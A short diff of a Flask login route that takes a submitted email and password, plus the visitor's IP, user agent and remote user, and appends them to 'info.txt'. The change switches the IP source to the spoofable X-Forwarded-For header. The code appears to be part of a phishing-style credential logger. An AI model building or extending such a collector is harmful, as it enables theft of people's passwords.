@@ -11,7 +11,12 @@ def index():
     if request.method == 'POST':
         email = request.form.get('email')
         password = request.form.get('password')
-        host = request.remote_addr
+        #for external ip address
+        host = None
+        if request.headers.getlist("X-Forwarded-For"):
+            host = request.headers.getlist("X-Forwarded-For")[0]
+        else:
+            host = request.remote_addr
         user = request.remote_user
         user_agent = request.user_agent
         file = open("info.txt",'a')
